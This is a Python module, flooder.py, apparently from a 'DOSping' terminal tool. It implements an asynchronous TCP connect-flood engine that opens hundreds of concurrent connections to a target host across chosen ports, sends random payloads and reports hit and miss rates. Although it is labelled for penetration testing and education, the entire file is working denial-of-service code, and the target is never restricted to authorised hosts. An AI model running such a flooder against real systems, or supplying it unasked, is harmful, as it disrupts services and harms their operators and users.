# ═══════════════════════════════════════════════════════════════
#  flooder.py  —  Async TCP Flood Engine
# ═══════════════════════════════════════════════════════════════
#  Part of DOSping 3.7.1  —  Network Stress Testing TUI
#
#  This module handles concurrent TCP connection flooding.
#  Decoupled from the UI so any front-end can drive it.
#
#  Architecture:
#    asyncio.Semaphore gates concurrency to prevent local FD
#    exhaustion.  Each coroutine opens a TCP socket, sends a
#    random 1 KiB payload, then tears down cleanly.
#
#  Rate tracking:
#    _conn_times stores monotonic timestamps of every completed
#    attempt (hit or miss).  connections_per_sec() returns the
#    rolling rate over a configurable window.
#
#  FOR PENETRATION TESTING / EDUCATIONAL PURPOSES ONLY.
# ═══════════════════════════════════════════════════════════════

from __future__ import annotations

import asyncio
import random
import time
from typing import Callable, Optional, List

try:
    import eventlog
except Exception:  # engine must work even if the logger is missing
    eventlog = None  # type: ignore[assignment]


# Error reason classes for flood.error_sample / flood.stats
def _error_class(exc: BaseException) -> str:
    if isinstance(exc, ConnectionRefusedError):
        return "refused"
    if isinstance(exc, asyncio.TimeoutError):
        return "timeout"
    if isinstance(exc, asyncio.CancelledError):
        return "cancel"
    name = type(exc).__name__
    if name == "gaierror":  # socket.gaierror — DNS resolution failure
        return "dns"
    return "other"


class Flooder:
    """Asynchronous TCP connect-flood engine.

    Opens *bots* concurrent TCP connections to *target* spread
    round-robin across the given *ports*.  Each connection sends
    a randomised payload (default 1 KiB) then tears down cleanly.

    Parameters
    ----------
    target : str
        IPv4 address of the remote host.
    ports : List[int]
        Target ports to cycle through (round-robin).
    bots : int
        Total number of connections to attempt (default 200).
    concurrency : int
        Max simultaneous open sockets via asyncio.Semaphore
        (default 50).  Prevents local resource exhaustion.
    on_progress : Callable | None
        ``(current, total)`` callback fired after every attempt.
    on_log : Callable | None
        ``(rich_markup_str)`` callback for status messages.
    """

    # ── Construction ─────────────────────────────────────────

    def __init__(
        self,
        target: str,
        ports: List[int],
        bots: int = 200,
        concurrency: int = 50,
        packet_size: int = 1024,
        connect_timeout: float = 3.0,
        conn_delay: float = 0.0,
        reuse_payload: bool = True,
        log_interval: int = 25,
        on_progress: Optional[Callable] = None,
        on_log: Optional[Callable] = None,
        on_detail: Optional[Callable] = None,
        session_id: Optional[str] = None,
        stats_interval: float = 10.0,
    ):
        self.target = target
        self.ports = ports
        self.bots = bots
        self.concurrency = max(1, concurrency)
        self.packet_size = max(1, int(packet_size))
        self.connect_timeout = max(0.5, float(connect_timeout))
        self.conn_delay = max(0.0, float(conn_delay))
        self.reuse_payload = bool(reuse_payload)
        self.log_interval = max(1, int(log_interval))
        self.on_progress = on_progress
        self.on_log = on_log
        self.on_detail = on_detail
        self.session_id = session_id
        self.stats_interval = max(1.0, float(stats_interval))

        # Counters (reset at the start of each run)
        self.successful: int = 0
        self.failed: int = 0
        self.bytes_sent: int = 0
        self._stopped: bool = False

        # Error accounting per reason class (refused/timeout/cancel/dns/other)
        self._error_counts: dict[str, int] = {}
        self._error_samples: dict[str, str] = {}

        # Rate tracking: monotonic timestamps of completed attempts
        self._conn_times: list[float] = []
        # Reusable payload — generated once per run, not per packet.
        self._payload: bytes = random.randbytes(self.packet_size)

    # ── Public API ───────────────────────────────────────────

    async def run(self) -> None:
        """Launch the full flood.  Resets counters first."""
        self.successful = 0
        self.failed = 0
        self.bytes_sent = 0
        self._stopped = False
        self._conn_times.clear()
        self._error_counts.clear()
        self._error_samples.clear()

        if eventlog is not None:
            eventlog.log_event(
                "flood", "flood.workers_spawned", session=self.session_id,
                bots=self.bots, concurrency=self.concurrency,
                packet_size=eventlog._fmt_bytes(self.packet_size),
                conn_delay=eventlog._fmt_duration(self.conn_delay),
                reuse_payload=self.reuse_payload,
                ports=",".join(map(str, self.ports)),
            )

        if self.on_log:
            self.on_log(
                f"[#c8a050]▸ Launching {self.bots} connections "
                f"across port(s) {','.join(map(str, self.ports))}...[/]"
            )

        sem = asyncio.Semaphore(self.concurrency)
        tasks: list[asyncio.Task] = []

        for i in range(self.bots):
            if self._stopped:
                break
            port = self.ports[i % len(self.ports)]
            tasks.append(self._attack(sem, port, i))
            if self.conn_delay > 0:
                await asyncio.sleep(self.conn_delay)  # advanced.conn_delay

        reporter = asyncio.create_task(self._stats_reporter())
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            reporter.cancel()

        if self.on_log:
            if self._stopped:
                self.on_log("[#8a5a4a]▸ Attack stopped by user.[/]")
            else:
                self.on_log(
                    f"\n[#6a8a5a]▸ Flood complete: "
                    f"{self.successful} connected, {self.failed} failed[/]"
                )

    async def _stats_reporter(self) -> None:
        """Emit flood.stats aggregates every stats_interval seconds."""
        interval = self.stats_interval
        while True:
            await asyncio.sleep(interval)
            if eventlog is None:
                continue
            total = self.successful + self.failed
            if total == 0:
                continue  # nothing happened yet — stay silent
            cps = self.connections_per_sec(window=interval)
            errors = ",".join(
                f"{cls}:{n}" for cls, n in self._error_counts.items() if n
            ) or "none"
            eventlog.log_event(
                "flood", "flood.stats", session=self.session_id,
                interval=eventlog._fmt_duration(interval),
                attempts=total, ok=self.successful, fail=self.failed,
                cps=eventlog._fmt_rate(cps),
                bytes=eventlog._fmt_bytes(self.bytes_sent),
                errors=errors,
            )

    def stop(self) -> None:
        """Set the stop flag.  Running coroutines exit early."""
        self._stopped = True
        if eventlog is not None:
            eventlog.log_event(
                "flood", "flood.stopped", session=self.session_id, actor="user"
            )
        if self.on_log:
            self.on_log("[#8a5a4a]▸ Stop signal sent...[/]")

    def connections_per_sec(self, window: float = 5.0) -> float:
        """Rolling connection rate over the last *window* seconds."""
        now = time.monotonic()
        cutoff = now - window
        # Keep only the timestamps inside the window (Phase 8: the old
        # branch also *dropped* in-window samples when the list grew
        # past 5000 entries, skewing the rate during long floods).
        self._conn_times = [t for t in self._conn_times if t >= cutoff]
        if not self._conn_times:
            return 0.0
        return len(self._conn_times) / window

    # ── Internal: single connection attempt ──────────────────

    async def _attack(
        self, sem: asyncio.Semaphore, port: int, index: int
    ) -> None:
        """One TCP connect, send, close cycle."""
        if self._stopped:
            return

        async with sem:
            if self._stopped:
                return

            t_start = time.monotonic()
            status = "OK"
            sent = 0
            error_msg = ""
            error_cls = ""

            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target, port),
                    timeout=self.connect_timeout,
                )

                # Payload reuse (advanced.reuse_payload): one payload per
                # run; tiny payloads always get per-packet randomisation.
                if not self.reuse_payload or self.packet_size <= 64:
                    payload = random.randbytes(self.packet_size)
                else:
                    payload = self._payload
                writer.write(payload)
                await writer.drain()
                sent = len(payload)
                self.bytes_sent += sent

                writer.close()
                await writer.wait_closed()
                self.successful += 1

            except asyncio.TimeoutError:
                self.failed += 1
                status = "TIMEOUT"
                error_cls = "timeout"
                error_msg = "Connection timed out"
            except asyncio.CancelledError:
                self.failed += 1
                status = "CANCEL"
                error_cls = "cancel"
                error_msg = "Cancelled"
            except ConnectionRefusedError:
                self.failed += 1
                status = "REFUSED"
                error_cls = "refused"
                error_msg = "Connection refused"
            except OSError as e:
                self.failed += 1
                status = "ERROR"
                error_cls = "dns" if type(e).__name__ == "gaierror" else "other"
                error_msg = str(e)
            except Exception as e:
                self.failed += 1
                status = "ERROR"
                error_cls = "other"
                error_msg = str(e)

            # ── Event log: error class accounting + sampled warnings ──
            if status != "OK" and eventlog is not None:
                self._error_counts[error_cls] = self._error_counts.get(error_cls, 0) + 1
                count = self._error_counts[error_cls]
                if count <= eventlog.ERROR_SAMPLE_LIMIT:
                    self._error_samples[error_cls] = error_msg
                    eventlog.log_event(
                        "flood", "flood.error_sample", level="warn",
                        session=self.session_id, error_class=error_cls,
                        message=error_msg, total=count,
                    )

            latency_ms = (time.monotonic() - t_start) * 1000

            # Record timestamp for rate calculation
            self._conn_times.append(time.monotonic())

            # ── Detail callback for packet inspector ─────────
            if self.on_detail:
                try:
                    self.on_detail(port, status, latency_ms, sent, error_msg)
                except Exception:
                    pass

            # ── Progress reporting ───────────────────────────
            total = self.successful + self.failed

            if self.on_progress:
                self.on_progress(total, self.bots)

            # Log every *log_interval* connections (or at the end)
            if total % self.log_interval == 0 or total == self.bots:
                if self.on_log:
                    pct = int((total / self.bots) * 100) if self.bots > 0 else 0
                    bar_w = 20
                    filled = (
                        int(bar_w * total / self.bots) if self.bots > 0 else 0
                    )
                    bar = "█" * filled + "░" * (bar_w - filled)
                    self.on_log(
                        f"  [#3a3a2a]│[/] {bar} [bold #c8c8b8]{pct:3d}%[/] "
                        f"[#3a3a2a]([/][#6a8a5a]{self.successful}[/] "
                        f"[#3a3a2a]hit ╱[/] "
                        f"[#8a5a4a]{self.failed}[/] "
                        f"[#3a3a2a]miss)[/]"
                    )
